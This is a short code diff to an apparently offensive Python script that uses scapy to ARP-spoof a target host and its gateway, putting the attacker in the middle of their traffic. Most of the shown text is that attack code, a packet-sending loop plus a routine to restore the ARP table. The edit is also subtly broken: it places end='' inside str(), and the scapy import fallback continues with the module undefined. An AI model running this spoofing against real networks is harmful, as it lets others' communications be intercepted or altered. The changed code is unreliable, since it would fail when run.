@@ -1,6 +1,10 @@
-#!/usr/bin/env python
-import scapy.all as scapy
+#!/usr/bin/env python3
 import time
+import os
+try:
+    import scapy.all as scapy
+except ImportError:
+    print("Cannot find scapy.all in ", os.sys.path)
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -31,7 +35,7 @@ try:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
         sent_packets_count = sent_packets_count + 2
-        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
+        print("\r[+] Packets sent: " + str(sent_packets_count, end=""))
         time.sleep(2)
 except KeyboardInterrupt:
     print("[-] CTRL+C detected. Restoring ARP table on target host.")
